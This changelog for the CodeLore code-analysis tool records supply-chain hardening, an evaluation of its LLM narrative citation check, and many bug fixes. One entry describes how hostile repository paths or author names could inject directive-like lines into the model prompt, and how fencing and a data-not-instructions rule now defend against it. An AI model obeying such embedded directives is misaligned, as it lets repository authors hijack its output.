- **The repository scores itself: an OpenSSF Scorecard workflow publishes the supply-chain posture weekly and on every main push.** Scorecard runs eighteen automated checks (token permissions, pinned dependencies, branch protection, dangerous workflows, SAST, …) and this repository already practices most of what they measure — the workflow makes that externally verifiable: results publish to scorecard.dev via OIDC attestation and upload as SARIF into code scanning, so a posture regression surfaces as an alert beside CodeLore's own findings. Alongside it, the Dependabot configuration states its update **cooldown policy explicitly** (7 days for action bumps; 5 days, 15 for majors, on crates) instead of relying on GitHub's silent default — the wait-out-the-yank window that the `bisync` incident showed matters in practice, delaying convenience bumps only, since security updates bypass cooldown by design.

- **The labelled corpus gained its first model-generated entries: a `fp-function-span` class seeded from the model study's own captured narratives.** The study's headline discovery — models quote functions the way the sheet names them (`write_top_hotspots@72-114`), and those line numbers live on the sheet only inside strings, so they flag on faithful text — is now a corpus class like the other over-flagging routes: three real llama3.2 narratives, each label-verified against the dossier it was generated from before entry (two further candidates were rejected during that review, one for fabricating a threshold the sheet never states, one for a gray-area numeric implication — the corpus's no-gray-areas rule applied to its own growth). The entries carry `source: "model:llama3.2-t0-s42"`, exercising the schema field reserved for exactly this, and the eval gate's totals moved with them: 59 entries, twelve classes, FP 19 in the confusion matrix, all pinned by the test and republished in the evidence doc together.

- **The narrative-evidence doc gained its first model study: a pinned 3B local model narrated every code-health-scored file in this repository, three times each.** The headline is a 65.5% `grounded ✓` rate on the realistic single-generation path, and the doc's study section owns everything beyond it — the per-item records committed beside the doc with the full provenance pins, the discovery of a sixth over-flagging route (function-span quotes) that makes the rate a lower bound on faithful generations rather than a hallucination rate, the in-the-wild confirmation of the corpus's CI-bound-quote prediction, and a clean two-part answer to whether temperature-0-plus-seed is deterministic (repeats yes, first generations no — which is where every verdict flip lived). Point-in-time evidence, deliberately not CI-gated; the paired frontier-model leg is pending an endpoint.

- **The `grounded ✓` stamp now has receipts: a labelled-corpus evaluation of the citation check, replayed deterministically in CI and published as `docs/narrative-evidence-v1.md`.** The advisory layer was the one part of the tool whose quality claim was stated rather than measured — §8.5 honestly listed the check's blind spots, but nothing said how the check actually behaves when it meets them. A labelled corpus now pins that behavior: entries across eleven classes pair narratives with fact values, a ground-truth faithfulness label, and the pinned verdict, covering the documented blind spots (small-int fabrication, percent collision, wrong attachment — all demonstrably total within their class, not occasional), the over-flagging routes where the check errs toward `⚠` on faithful text, outright fabrications, and faithful narratives with rounding, separators, signs, and benign percent-unit conversions. Building the corpus surfaced two over-flagging routes the honest-limits list had not named — a narrative quoting a corpus-percentile CI bound flags because the sheet renders the interval as one en-dash string that never parses into the fact-value set, and ordinal phrasing ("the 97th percentile") flags because percentiles live on the sheet as fractions and the ×100 fallback needs a percent sign — both now documented in §8.5 and the evidence doc. The evaluation runs as an ordinary test with no model anywhere in it: authored entries measure class-conditional checker behavior exactly, which is the question a deterministic checker can answer; prevalence on real narratives needs model-generated entries, and the corpus schema reserves a `source` field for appending them without changing the harness. The test enforces corpus, checker, and doc move together — it derives each entry's expected quadrant from its class independently of the entry's own labels, so a mislabelled entry cannot enter silently, and any checker change that moves a verdict fails naming the entry.
  `check_citations` itself gained diagnostics for its two numeric blind spots — the tokens the ≤ 12 whole-number exemption skipped and the percent tokens grounded only by the ×100 fallback — so their incidence can be measured rather than guessed at. Neither influences the verdict: the grounded/unmatched semantics are byte-identical, which the existing unit suite pins, and cached narratives re-stamp unchanged.

- **`main` is now re-verified weekly, because a commit that passed CI can stop being good without changing.** `push` and `pull_request` together answer "was this commit correct when it landed" and never "is it still correct", yet several checks depend on the world outside the repository. `cargo-deny` is the clearest case: a yank or a freshly published advisory invalidates a `Cargo.lock` that passed, with no commit involved. That is not hypothetical — a `chacha20` yank went undetected for six days and finally surfaced as a red `cargo-deny` on an unrelated pull request whose diff touched no manifest at all, which is a confusing and expensive place to discover `main` is broken. A `schedule` trigger now runs the full matrix every Monday at 06:17 UTC, deliberately off the hour because schedules bunched on exact hour boundaries get throttled.
  It publishes nothing, which was checked rather than assumed: the gh-pages push in `dogfood` is gated on `github.event_name == 'push'` and the gate verdict on `== 'pull_request'`, so neither step fires on a scheduled run, and the `paths-ignore` filter is scoped to `push` so the full matrix always runs. Concurrency is unaffected — a scheduled run reports `refs/heads/main` and main's current SHA, landing in the same per-SHA group as a deliberate re-dispatch of that commit, which is exactly the same-SHA replacement that group was designed for. One operational caveat is worth knowing: GitHub disables scheduled workflows after 60 days without repository activity, and re-enabling them is manual.

- **`codelore-rca` now enforces `unsafe_code = "forbid"`, which the workspace claimed but did not apply to it.** The crate declines workspace lints so vendored MPL code is not rewritten to satisfy clippy, and Cargo's `[lints] workspace = true` inheritance is all-or-nothing — so declining the clippy block also declined the safety lint, leaving the crate that wraps the tree-sitter grammars as the one crate where `unsafe` would have compiled without complaint. Nothing was actually wrong: the tree has zero executable `unsafe`, and the only textual matches are doc comments explaining why `unsafe { env::set_var }` was avoided. What was wrong was the guarantee — asserted workspace-wide while holding for two crates in three. The lint is now declared directly on the crate, so the merge-friction policy is untouched. One consequence worth knowing: `forbid` cannot be locally overridden, so `unsafe` arriving in a future upstream sync becomes a hard error at merge time rather than a warning at review time, and the honest response then is to port the code rather than downgrade the lint.

### Changed

- **Blind-spot incidence in the narrative-evidence corpus is now reported per provenance, because a single pooled total tracked whichever model contributed most recently rather than the checker.** The corpus gained five entries contributed by an independent cross-model replication (`source: "model:deepseek-v4-pro"`) — three further `fp-function-span` cases and two `clean` narratives, the latter written in Chinese, which the checker grounds identically because it reads numeric tokens rather than prose. Pooled, they would have moved the published small-int exemption count from 28 tokens to 114, with five of the sixty-four entries carrying 86 of them. The eval test now pins hand-authored (56 entries, 19 exempt tokens, 0.34 per entry) and model-generated (8 entries, 95 tokens, 11.88 per entry) separately, and pins the combined headline as the sum of those rows so it cannot drift from them. The split is a finding rather than a hedge: every model-generated narrative trips the small-int exemption and none reaches the percent fallback, while the authored entries are the mirror image — so neither provenance alone characterises the checker, and the two contributed models differ from each other by roughly six times per entry. Corpus totals move with it — 64 entries, `clean` 20, `fp-function-span` 6, confusion matrix TN 20 / FP 20 / TP 9 / FN 15 — all republished in the evidence doc.
- **`cargo binstall codelore` is now declared rather than inferred, and it will no longer silently accept a third-party build.** The README recommends binstall as the fast install path, and it did work — but incidentally: our release archives happen to match one of binstall's built-in probe patterns, a list whose contents and ordering belong to binstall rather than to this project. The manifest now states the artifact URL, the binary's location inside the archive, and the per-platform format outright, so a documented install path stops depending on a coincidence. The substantive half is the refusal: binstall's normal fallback, when it finds no official asset, is the quickinstall third-party host, which serves *its own* builds of this crate carrying none of the provenance the release workflow attests. Substituting an unattested binary is the wrong default for anyone who chose this tool partly for that posture, so the fallback is disabled; compilation from source stays enabled, so a target we do not publish still installs, just slowly, from code the reader can audit. Verified against the published v0.28.0 release rather than the workflow source: the rendered URLs match all five asset names, and the binary sits at the archive root where the declaration says it does.

- **The README leads with Quick start.** The install-and-first-run block sat two hundred lines below a wall of ten decorative topic badges and the full analysis catalogue; a reader had to scroll past the entire pitch before seeing a runnable command. Quick start now follows the screenshot and nav row directly, a one-line pitch sits under the tagline, and the topic badges move to a footer — same content, conversion-ordered.

- **The README carries the live OpenSSF Scorecard badge.** The scorecard workflow's first publish run succeeded (results signed and uploaded to scorecard.dev), so the posture score is public, self-updating, and one click from the per-check breakdown in the viewer.

- **The four job-scoped workflows pin an empty workflow-level permission default.** Every job in the attestation, bench and container workflows already declares exactly the scopes it uses, but no workflow-level block stood behind them, so a future job added without its own block would have started from the platform's default grant; each workflow now opens from `permissions: {}` and a new job starts from zero. Behavior-neutral for existing jobs — a job-level block replaces the workflow default entirely — and the change closes four of the five workflow-permission warnings the Scorecard run surfaced (the fifth, the Dependabot auto-merge write union, is a recorded finding awaiting a live Dependabot PR to validate a narrowing against).

- **Sweeping an analysis threshold no longer re-walks the entire history.** The ingest cache keyed on every `Options` field, so `--min-revs 5` → `--min-revs 10` was a full re-ingest *and* consumed one of the five per-repo cache slots — making threshold sweeping, the most natural way to use the tool, the most expensive thing a user could do. Twenty-one options are read only by `analyses/` and `quality_gates/` and never by the ingest; they no longer split the key. The classification was established by enumerating every `opts.<field>` token appearing anywhere under `repo/`, `facts/`, `kamei/`, `identity/`, `imports/`, `clones/` and `paths_filter.rs` — the *positive* direction, because a negative "none of these appear" search cannot distinguish a true absence from a broken matcher, and one such search did silently return clean for every option during this work. Twelve fields appear in code; a thirteenth, `time_bucket`, appears only inside a doc comment naming a session TEMP table built at analysis time, which a token count alone gets wrong in either direction.
  Reading is evidence, not proof, so the split ships with the proof: a test ingests the same repository twice — once with defaults, once with all twenty-one knobs moved off their defaults simultaneously — and asserts a per-table digest of every row of every table is identical, with table discovery done dynamically so a new table joins the comparison without anyone remembering. Its anti-vacuity control had to be corrected during development: the first control flipped `include_merges`, which changes nothing on a linear fixture, so it proved nothing about the digest's sensitivity; it now excludes every path, whose effect is visible on any non-empty repository.
  Structurally, `ingest_cache_json` *subtracts* from `canonical_json` rather than being built independently, so the two cannot drift, and the exhaustive-destructure guard still forces every new field to be classified. `canonical_json` itself is deliberately unchanged: `change_set::report_key` keys the agent-loop report cache on it and needs the analysis-only knobs, so narrowing it in place would have made two gate runs at different thresholds share a report entry and serve a wrong verdict. `CACHE_EPOCH` moves to `schema_v19` to discard entries written under the old classification — they hold correct facts but are unreachable by the new key, and would otherwise occupy slots forever.

- **The three `num`-family crates carry the comment explaining why one of them cannot be found by searching for it.** `codelore-rca` declares `num`, `num-derive` and `num-traits`, and they serve three different consumers in the six generated `language_*.rs` files: `num` the call sites (`num::FromPrimitive::from_u16`), `num-derive` the attribute, and `num-traits` that attribute's *expansion*, which emits `extern crate num_traits as _num_traits;`. An `extern crate` item resolves only against the declaring crate's own extern prelude, which is why a transitive copy cannot serve it and why the failure surfaces as `E0463` — a crate-resolution error rather than a path error. `num-traits` is the only dependency in the workspace that appears nowhere in the source text, verified by censusing every declaration in all four manifests across normal, dev and build sections; every other one has a real, non-comment use. It has now been reported as removable by two independent auditors and by `cargo-machete`, so the manifest says so on the line itself. Commenting only `num-traits` would have left the next reader wondering why a crate and its own facade are both declared, so the note covers the group. The manifest now also declares `[package.metadata.cargo-machete] ignored = ["num-traits"]`, which is the half of this a scanner can act on: every report of this dependency so far arrived as tool output, and a comment only reaches someone who opens the file. That entry is not a gate and does not suppress the grammar findings, which stay visible because they are the evidence that the tool's analysis cannot see through a macro. Aliasing the facade away was considered and rejected; the measurement is in the cycle-19 report.

### Removed

- **`SpaceKind::Namespace` and `SpaceKind::Struct` are gone, a breaking change to `codelore-rca`'s published API.** Both lost their only producer when the unreachable-grammar excision deleted `impl Getter for CppCode`, whose arms were `StructSpecifier => SpaceKind::Struct` and `NamespaceDefinition => SpaceKind::Namespace`; nothing has been able to construct either since. That was established rather than assumed: `SpaceKind` derives `Serialize` but not `Deserialize`, so no value can arrive from data; it has no `FromPrimitive` and no conversion impls; `Default` resolves to `Unknown`; no macro expansion emits it; and the union over all six `Getter` impls is `{Unknown, Function, Class, Unit, Interface, Trait, Impl}`. It was then confirmed by deleting the variants and building — the standard this repository set for its dependency removals, and the one that catches a reachability argument that turns out to be wrong, which is precisely how a macro expansion defeated one here before. Four match arms went with them, not the two first recorded: two in the fork's own `Display`, and two in the product's `space_kind_str`, which had been dispatching on values its own dependency could no longer hand it. `#[deprecated]` would have been the graceful alternative and was unavailable — the lint fires on *pattern* matches, the product had two, and CI runs `-D warnings`, so marking the variants would have broken the build and the only way through would have been an `#[allow]`. Blast radius is one crate: `codelore-rca` has exactly one reverse dependency on crates.io, and it is `codelore-lib`.

- **`codelore` no longer declares `dirs`, which only `codelore-lib` uses.** All three mentions of it in `codelore-cli`'s sources are comments describing `codelore-lib`'s cache-root resolution; the single real call, `dirs::cache_dir()`, lives in `codelore-lib/src/cache.rs` alongside that crate's own declaration. Verified the same way as the removals below — by deleting the declaration and building, not by searching for the name, which is what would have gone wrong here since the name does appear in the crate's text. Nothing about the build changes.

- **`codelore-rca` no longer declares `serde_json` and `rayon`, which nothing in it uses.** They are residue from upstream `rust-code-analysis`, which used them for JSON output and parallel walking; the vendored subset that survives here does neither. Nothing about the build changes — both remain in the graph as direct dependencies of `codelore-lib` (and `serde_json` of `codelore-cli` too), so this is manifest hygiene rather than a supply-chain or compile-time reduction. The value is that a vendored crate's manifest should describe what the vendored code actually needs; overstating it misleads the next person trying to work out what the fork still depends on. **`num-traits` was in the same candidate list and is deliberately kept** — it is required and only *looks* unused; the `Changed` entry above carries the mechanism, and the manifest now carries it on the line. That distinction is why the removals here were confirmed by building without them rather than by searching for them: "absent from the source text" and "safe to remove" are different predicates, and a text-based unused-dependency scanner reports the first while implying the second.

### Fixed

- **The narrative-evidence doc now says which prompt its model-study rates describe.** The per-item record has always pinned `prompt_version`, but the prose never surfaced it — and the prompt has since been hardened to fence the fact sheet and escape control characters in rendered values, so the published grounded rate characterises a prompt the tool no longer ships while reading as current. Attributing evaluation results to the version they were measured under, rather than letting them be compared silently across versions, is the established practice — EleutherAI's evaluation harness enforces it by requiring a task's version to be incremented whenever its prompt template changes, precisely so users can verify whether a comparison is drawn from identically configured runs. The versioning half was already implemented here; the reporting half was missing. The limits section now states it, and states why a current-prompt rate needs a fresh leg rather than a re-run: the record stores verdicts, not fact sheets, so replaying against today's build regenerates the sheets from analyses that have moved independently of the prompt — advancing both variables at once and confounding the one comparison such a leg exists to make. The isolating design is recorded beside it (apply the prompt change alone to the pinned subject tree, leaving the sheets byte-identical), along with the fact that a local model makes that leg free of API cost.

- **`hotspots` no longer reports a file it could not measure as perfectly healthy.** A file with no complexity data — a language with no tree-sitter grammar, an unreadable blob, one past the AST byte cap — entered the ranking through a `LEFT JOIN` with `COALESCE(cognitive, 0)`. Zero normalises to `norm_cx = 0`, which yields `cognitive_health = 100`: the top of the scale. Measured on a fixture, an unscanned file scored 100.0 while the two real files scored 60.0 and 86.7 — the coverage gap outranked the code, and read as a verdict rather than an absence. `code-health` INNER JOINed the same row away entirely, so the two headline analyses held opposite silent semantics for one missing measurement. The ranking now excludes what it cannot measure, matching `code-health`; `file_complexity` additionally filters `cognitive IS NOT NULL`, because the column is nullable and `MAX` skips NULLs, so an all-NULL group would otherwise survive `GROUP BY`, satisfy the join, and re-enter carrying a value the formula cannot represent as absent — the same wrong answer by a second route, which the fixture also pins. This moves published numbers and is meant to: both `PERCENT_RANK` windows are computed over the surviving set, so removing the floor of zeros lowers `pr_cx` for scanned files, making both ranks percentiles among files the scan can see — what the neighbouring `mi_rank` CTE has always documented for `mi`. Corpus-anchored scores are unaffected, which was checked rather than assumed: `hotspot_score_anchored` takes its churn term from a separate query over `changes` with no complexity join, so the `hotspot_anchored_max` gate does not move. The repo-relative `hotspot_score_max` gate does move, and is the one threshold to re-baseline after upgrading: it reads the same `hotspot_score` column these windows recompute, so a config that pinned a ceiling against the old distribution is comparing against a different one now. Because an undisclosed absence is the same failure one step to the left, the exclusion ships with a count: a run whose excluded files outnumber its ranked ones says so, on the same majority predicate the oversize disclosure uses so routine repositories stay quiet. The probe shares its CTEs with the ranking query rather than restating them, so it cannot report coverage for a population nobody ranked, and Parquet output — which bypasses `run_hotspots` — invokes the disclosure directly.

- **Every failing-command test now pins the exit code it expects, instead of accepting any failure at all.** Ten assertions checked only that the command failed — which accepts any nonzero status, including the one a panic produces under this workspace's unwind strategy and a signal kill besides. That is not a hypothetical gap: a wrong exit code shipped for a whole release behind exactly such an assertion, because the test could not tell the correct code from the incorrect one. Each code was measured against a built binary rather than reasoned from the source, which turned out to matter — two of them changed answer on re-measurement, since the first attempt failed earlier in the pipeline than the test does. The gate-violation case is deliberately pinned to the verdict code rather than an error code, because a violation is a result the tool computed correctly, and that distinction is the whole point of the contract.

- **The quality gates now also refuse a repository that has no commits yet.** Requiring the repository to open closed the general case — a path that is not a repository at all — but opening succeeds on a freshly initialised repository whose HEAD points at nothing, so a narrower version of the same defect survived: `git init` with no commits still passed vacuously when the verdict was rendered as text and failed as SARIF, because only the SARIF path went on to resolve HEAD. The verdict still depended on how the output was asked for, which is precisely what the first fix set out to remove. Both commands now resolve HEAD as well as opening the repository, which is what the analysis pre-flight has always done, and the regression test covers the empty-repository case across every gating surface and both output formats.

- **A trend sample point that could not read its files no longer renders as perfect health.** Both scans behind the architecture- and health-trend charts discarded unreadable, oversized and unparseable files without counting them: the import scan did it silently, with no message at any level, and the complexity scan logged each file but never totalled them, so a revision where every read failed produced a stream of warnings and then a table indistinguishable from a genuinely clean revision. The effect on the chart runs one way only. The import graph's node count comes from the list of files alive at that revision rather than from the files actually read, so a revision whose reads fail keeps its denominator while losing its edges — propagation cost falls and architectural health rises. Both health figures return a perfect score over an empty input, and the file count shown beside them is that same unaffected denominator, so the one column a reader could use to notice a thin scan does not move. Both scans now use the coverage accounting the other passes already had, and warn when coverage degrades or when skipped files outnumber scanned ones.

- **The clone scan the tool actually runs now says what it could not read.** Two clone passes exist: one over the committed tree at ingest, which has carried coverage accounting since it was written, and one over the working tree, which `analyze`, `gate`'s change-set projection and `diff` all consume. The second had none — an unreadable file was dropped with no message at any level, so a scan that reached five files out of five thousand returned exactly the value of a scan that genuinely found no duplication. Both passes now use the same accounting: an unreadable file is a counted loss and says so, an over-cap file is a tracked skip rather than an invisible one, and the pass warns when coverage degrades or when skipped files outnumber scanned ones. The coverage module moves from private to crate-visible to make that possible, which is precisely what had kept it out of reach of the pass that needed it most.

- **`codelore gate` and `codelore check` no longer report a passing gate for a repository that does not exist.** Both commands read their thresholds first, and threshold discovery resolves `.codelore-thresholds.toml` under the repository root — a path that a missing root satisfies trivially by being absent, yielding the default empty set. The commands then took their "no thresholds configured, vacuously passing" branch, exited 0 and wrote `result=pass` for a workflow to read, all before the repository was ever opened. A typo in a CI job's `--repo` therefore produced a green gate on the two commands a pipeline actually branches on. `check` carried the sharper form of it: the vacuous branch opened the repository only when emitting SARIF, so the same bad path exited 3 as SARIF and 0 as text — the verdict depended on how the output was requested. Both now open the repository before reading thresholds, so a bad path is the same exit-3 repository error `analyze` and `diff` already report, and the vacuous pass keeps meaning what it says: a real repository with nothing configured to check. The regression test pins all five gating surfaces and both `check` formats, because a single-format test would have passed while the defect was live.

- **Two tests that had never executed their own assertions now do.** A loop of the form `for row in &rows { assert!(…) }` passes when the query returns nothing, so a test can be green for its entire life without ever reaching the check it exists to make. Eight such loops gained a cardinality floor; six were already satisfied and now pin the guarantee, and two were not. The coupling test exercised a "require at least two shared revisions" threshold against a fixture with no co-change history at all, so it matched zero rows and the threshold was never checked; it now runs against the fixture built for exactly that, which guarantees a pair sharing five commits. The dashboard test is the only coverage anywhere for the x-ray, clone-summary and trend queries, and three of its six loops never ran: the fixture's functions are all empty bodies, so their cognitive complexity is zero and the x-ray query's own `> 0` filter excluded every row. It now uses a fixture carrying branchy functions, a deliberate clone pair and dated commits. The scoring-isolation guard was widened in the same pass — it scanned seven hand-listed directories, so a scoring module could import the advisory layer merely by living outside them; it now scans every source file with a named exemption list, strips comments so prose mentioning the layer cannot trip it, and carries a self-test proving the matcher catches each import form while staying quiet on each prose form.

- **`--output -` no longer leaves a `-.provenance.json` behind, because the dash is now resolved once instead of at each output site.** Two emitters had learned to read `-` as stdout, but the provenance sidecar derives its own filename from `--output` and is not an emitter, so it never passed through their filter and wrote a file named for the dash into the working directory — the same defect the emitters had already fixed, surviving at the one consumer nobody thought to filter. The dash is now resolved immediately after the gate that rejects it for the formats that genuinely cannot stream, so every consumer past that point sees "no path" rather than a path it might mistake for a filename, and a new consumer inherits the behaviour instead of having to remember it. The regression test asserts the absence of both files, and the sidecar is the one it is named for.

- **The advisory layer's request timeout is now operator-settable through `CODELORE_LLM_TIMEOUT_SECS`.** The 120-second budget was a hardcoded constant with no override, while every other knob on that client — provider, base URL, API key, model — reads an environment variable. The number is a budget rather than a fact: a small local model answers in seconds, but a larger or remote one can approach the ceiling, and a user who hit it had no recourse short of editing the source and rebuilding. That is not hypothetical — an external evaluation of the narrative layer had to patch this exact constant to run a slower model at all, which is how the gap surfaced. A value that is not a positive whole number warns and keeps the default rather than aborting: the layer is advisory, so a typo in an optional knob should not fail an analysis, but it should not pass silently either, since a mistyped budget that quietly kept the old one would look exactly like the ceiling the override exists to raise. Zero is refused rather than read as "no limit", which would abort every request instantly.
- **PR-mode SARIF is graded on the same severity scale as every other surface, so the same repository no longer scores differently depending on which command produced the file.** The emitter behind `codelore diff` kept a tenth-scale severity proxy and a hardcoded result level after the shared emitter was corrected to a quarter-scale one. Because a file's cognitive health is bounded below at 60, a tenth-scale score can never exceed 4.0: the `error` band was unreachable, and a structurally healthy file emitted a severity that GitHub reads as "no severity" — on the one surface that posts findings onto pull requests, which is where they are most likely to be acted on. The derivation now lives in the SARIF module as a single function returning the severity and the level together, so the two cannot disagree, and both emitters call it; the diff emitter already borrowed its fingerprint helpers from there, so this follows a seam that existed rather than adding one. Results describing a score *increase* are deliberately left alone: they carry no health value, so inventing a grade for them would be worse than the fixed level they keep. The regression test asserts a property that no single-value test can see — that every band is reachable across the real health range — which is exactly what the capped divisor violated, and the diff surface additionally asserts that a result's level agrees with its own severity.

- **`--output -` now means stdout for `--format step-summary`, instead of creating a file named `-`.** The dash is rejected at the CLI boundary for `parquet`, `sqlite` and `spa` because those write through file-path machinery and genuinely cannot stream. `step-summary` streams to stdout *by default*, so for it the dash is a destination to honour rather than refuse — but it never reached the filter its sibling emitter applies, took the publish branch, and wrote a file literally named `-` into the working directory while the caller's redirect captured nothing. Each documented recipe was safe on its own: the guide's step-summary example relies on bare streaming, and the README's `--output -` example is on the `diff` path, which routes correctly. The failure needed someone to combine them, which the documentation invites by teaching the dash as the conventional spelling of stdout in one place and default streaming in another. The regression test pins both halves — the summary reaches stdout, and no `-` file is left behind — and no test previously exercised this format's output routing at all.
- **A repository misconfiguration passed to `codelore mcp` now exits 3, the code the contract has always specified, instead of 1.** The startup guard that refuses to serve an unusable repository — added so a typo'd path in a client config fails at connect time rather than on every tool call — raised both its failures through a formatting macro that interpolated the underlying error into a *string*. Nothing typed survived in the cause chain, so the exit-code mapping found no `CodeLoreError` to consult and fell back to the "unknown error" code, quietly contradicting §6.6 on the one path the guard exists to serve. Both sites now construct the error the way the analyze pre-flight already does, which keeps the variant intact for the chain-walk. The behaviour and the message were never wrong; only the number a script reads was. The test that covered this asserted merely that the process failed, which accepts any nonzero status — including the 101 a panic produces, since the workspace unwinds, and a signal kill besides. It now pins the exact code, which is what makes the guarantee checkable rather than assumed. A sweep of the remaining error-formatting sites in the CLI found no others of this shape: the only similar constructions wrap transport errors from the MCP library, which carry no typed variant to preserve, so their fallback is correct.

- **Four hardening fixes in the panic-and-silent-no-op class.** The gate-run history renderer byte-sliced an untrusted `head_sha` at 12 bytes — `gate_runs.jsonl` is hand-editable, and a multi-byte character straddling the boundary panicked the whole `check` run; the display prefix (and the two provenance-safe truncations shaped like it) now cuts on character boundaries. All fifteen float sorts using `partial_cmp(..).unwrap_or(Equal)` moved to `total_cmp`, the pattern the other seven float-sorting files already use — the `Equal`-on-NaN fallback makes the comparator intransitive, which current Rust sorts are entitled to detect and panic on. The global cache pruner learned a keep-path: it runs immediately after the ingest renames the entry it just wrote and immediately before that entry is re-opened, so whenever the byte cap still bound after every older entry was gone it deleted the file the run was about to read, failing the run that produced it. And a fully empty calibration artifact — no `languages` pools and no `repo_metrics` pools — is rejected at load with a message naming the consequence: it passed every structural check while turning the corpus lens into a silent no-op indistinguishable from "not in corpus" (`calibrate` already refused to *write* one; now a hand-built one cannot be *read* either). An artifact carrying only `repo_metrics` pools stays valid — the architecture percentiles need no per-language pools.
- **Three silent-pass holes are now impossible, and closing one of them fixed the differential oracle.** The browser-suite CI job exports `CODELORE_REQUIRE_BROWSER`, and every Chrome-skip site asserts it is unset before skipping — a broken Chrome install fails the only job that executes the dashboard's JS instead of turning it into a two-minute green; contributor machines without Chrome still skip cleanly. `check`'s gate evaluator exhaustively destructures the thresholds struct, so a new field that nobody classifies as gate, policy, or modifier is a compile error at the evaluator rather than a silently unenforced threshold. And the per-table fact-store digest moved into the shared test-support module so a new differential gate could ingest the same repository through BOTH `Repo` backends and require byte-identical digests for every fact table — the backend-equivalence promise the differential suite made but only ever checked field-by-field. The `hunks` table is excluded by name with the reason on the row (the CLI oracle emits none — a recorded divergence awaiting a decision), and an assert keeps that exclusion honest: the moment the tables stop diverging, the test demands the exclusion be deleted. The gate paid for itself on its first run: `GitCliRepo` trimmed the trailing newline git stores in every commit message while `GixRepo` kept it, so the oracle diverged from production on all fifty fixture rows; the oracle now keeps `%B` byte-exact. No cache impact — the production walker is unchanged.

- **Per-file SLOC no longer double-counts function bodies.** `complexity_metrics` holds the whole-file unit space plus one row per nested impl/class/function, and those spans overlap — three consumers summed them, inflating every file's SLOC by a function-density-dependent factor (roughly 2x for flat functions, 3x for methods inside an impl): effort-exposure's band shares, code-familiarity's familiarity/islands denominators, and the knowledge DOE size term, one of them under a comment asserting the sum was the file-level value. All three now take the file-spanning unit row via `MAX`, the aggregation `code-health` always used. The shift is by design and was measured on this repository before landing: effort-exposure's red band drops about 1.3 points of loc-share (the overweighting of function-dense files removed) and the repo familiarity figure moves ~0.15. A seeded regression test pins the per-file value against both row shapes and fails with the exact doubled figure on the summing form.

- **A recycled filename no longer inherits the previous file's entire history.** The rename-lineage map carefully date-guards chain *construction* — its recursive CTE exists to stop `A → B` and a later, unrelated `C → A` from fusing into a fictitious `C → A → B` — but the join that *applied* the map matched on name alone, for all of history, in both directions of time. Rename `a → b`, later create a new unrelated `a`, and every commit to the new file canonicalized onto `b`: the new file vanished from every path-aggregating analysis while `b` absorbed a stranger's revisions, churn, and authors. Canonical lineage is on by default, and the Kamei enrichment runs at ingest, so the mis-attribution was persisted into the cached fact store rather than recomputed per run. The map now carries one row per *retirement epoch* — the commit that renamed the name away, plus the previous epoch's boundary — and the join only canonicalizes rows that fall inside that half-open window, so a twice-retired name maps each epoch to its own target. Two adjacent holes closed with it: `copied` rows also carry `rename_from` but a copy does not retire its source, so copies no longer seed or extend chains; and same-second renames follow the documented rowid tiebreak in the application join, not just the CTE. Regression tests pin all three (an end-to-end recycled-name repository, a twice-retired name mapping each epoch separately, and a copy creating no edge), and the recycled-name test fails on the un-time-bounded join. `CACHE_EPOCH` moves to `schema_v21`: cached stores may hold Kamei features computed through the conflating join.

- **A scan that skipped most of the repository for size no longer reads as full coverage over an empty table.** Files past the AST byte cap are deliberately not counted as coverage losses — the cap exists to skip generated and minified bundles, and repositories carry those routinely — but that classification had no ceiling: a bundle-heavy repository reported 100% clone coverage over a near-empty `clones` table, the reads-as-improvement failure mode one classification to the left of the one the loss ratio removes. Oversize skips are now tallied as their own outcome, still outside the loss ratio, and each pass warns once when the skipped files outnumber the scanned ones — the table then describes a minority of what looks like source, and the warning says so and points at `.codeloreignore`. The disclosure predicate is tested directly (strict majority; a tie stays quiet) so the warning and its tests cannot drift apart, and the cap plus both aggregate warnings are now documented in the performance section of the user guide.

- **`--time-bucket` with a composite format is rejected instead of silently blanking half the dashboard.** The per-analysis gate keys on the analysis the user NAMED, but `--format spa` and `--format step-summary` fan out to dozens more analyses with the same options. Under bucketing, their source table's `rev` is a date-truncated string, so every commit-keyed join matched zero rows — and the composites' per-widget degradation wrappers catch errors, not emptiness, so the affected widgets rendered blank with no signal, on top of a bucketed knowledge-shares build poisoning its guarded cache for the rest of the run. The combination now fails at the CLI boundary (exit 2) with the supported alternatives spelled out, pinned by a test that names a bucket-aware analysis precisely so the older per-analysis gate cannot be the thing that catches it.

- **Every provenance stamp names the arrow generation that is actually linked.** A direct `arrow` dependency had drifted a major ahead of the one `duckdb` pins, putting two arrow generations in the build graph, while the runtime-version constant — written into every provenance sidecar and the fact store's provenance table — kept describing the other one; the drift guard read the first lockfile match and passed. Nothing here ever used the direct dependency (parquet output goes through DuckDB's own COPY, the ingest uses the row-level appender, and the facade's type re-exports had no consumers), so it is gone along with the arrow-typed appender feature: one arrow generation remains, the stamped version is true again, and the lockfile sheds the duplicate family. The guard now fails loudly on duplicate lockfile entries instead of picking one, with its own matcher self-test proving the duplicate case panics.

- **SARIF findings can finally reach their own `error` band, and every rule carries the metadata consumers actually read.** The hotspot severity proxy divided by 10 on a health value bounded to [60, 100], capping `security-severity` at 4.0 — the `error` branch (≥ 7.0) was unreachable, and a structurally healthy hotspot emitted 0.0, which GitHub renders as "no severity"; the emitter's own tests could only reach the bands with out-of-range fixture values, which is how the dead branch hid. The divisor now spans the real range (`(100 − health) / 4`, floored at 0.1 so every emitted hotspot carries a grade). Alongside it, all five rule surfaces gained the fields GitHub's alert UI is driven by: `fullDescription` and `help` (with the markdown form GitHub prefers) where missing, `defaultConfiguration.level`, `properties.precision` on the hotspot rule, and `properties.problem.severity` — the correct severity channel for non-security rules, since `security-severity` is semantically a vulnerability score. Severity-band tests now use in-range health values, and a new test pins the 0.1 floor.

- **The advisory layer's local-first claim is now enforced, and its prompt treats repository text as data.** An ambient `ANTHROPIC_API_KEY` — commonly exported for unrelated tooling — used to silently select the hosted dialect, sending fact sheets (paths, author identities, function names, scores) to the hosted API while the documentation promised nothing leaves the machine without an explicit change; the hosted dialect now requires an explicit `CODELORE_LLM_PROVIDER=anthropic`, and a key without it is an error naming the fix. A bearer token configured against a plain-http endpoint is now accepted only for loopback hosts (parsed as real addresses — a hostname like `127.evil.example` does not pass), since any other http host would carry the credential unencrypted. And the prompt fences the fact sheet in `<fact_sheet>` markers with an explicit data-not-instructions rule, while the renderer escapes control characters in values — git permits newlines in paths and near-arbitrary author names, so hostile repository content could previously spell directive-looking lines or forge extra fact lines in the prompt. The grounded stamp was never forgeable (numeric ground truth is collected from typed values before rendering) and that property is now pinned by a regression test as a stated contract. The prompt version moves to its next value, so cached narratives from the old wording recompute naturally.

